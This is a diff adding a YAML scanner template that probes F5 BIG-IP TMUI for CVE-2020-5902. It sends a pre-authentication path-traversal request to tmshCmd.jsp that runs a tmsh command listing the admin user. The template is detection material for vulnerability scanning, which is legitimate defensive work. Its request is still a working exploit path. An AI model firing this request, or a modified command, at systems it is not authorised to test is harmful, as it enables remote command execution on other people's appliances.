@@ -1,0 +1,16 @@
+name: poc-f5-tmui-rce
+transport: http
+set:
+  r0: randomInt(1000, 9999)
+rules:
+  r0:
+    request:
+      method: GET
+      path: "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin"
+    expression: response.status == 200 && (response.body.bcontains("admin") || response.body.bcontains("root"))
+expression: r0()
+detail:
+  author: sxel
+  description: F5 BIG-IP TMUI unauth RCE probe (CVE-2020-5902, pre-auth tmshCmd on affected versions)
+  severity: high
+  tags: f5,bigip,tmui,rce
